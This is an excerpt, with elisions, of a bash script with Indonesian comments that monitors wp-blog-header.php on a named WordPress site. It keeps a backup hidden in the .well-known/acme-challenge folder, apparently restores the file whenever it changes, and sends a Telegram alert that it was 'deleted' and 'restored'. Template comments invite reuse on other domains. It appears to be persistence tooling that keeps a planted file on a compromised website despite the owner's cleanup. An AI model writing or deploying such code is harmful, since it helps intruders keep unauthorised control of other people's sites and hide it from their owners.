...
INDEX_FILE="/var/www/vhosts/spaatthewoods.com/httpdocs/wp-blog-header.php"
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/var/www/vhosts/spaatthewoods.com/httpdocs/.well-known/acme-challenge"
...
monitor_file() {
    while true; do
        ...
        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            ...
            echo "spaatthewoods.com"
            send_telegram_notification "https://www.spaatthewoods.com/ di hapus.  DI KEMBALIKAN." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
        fi
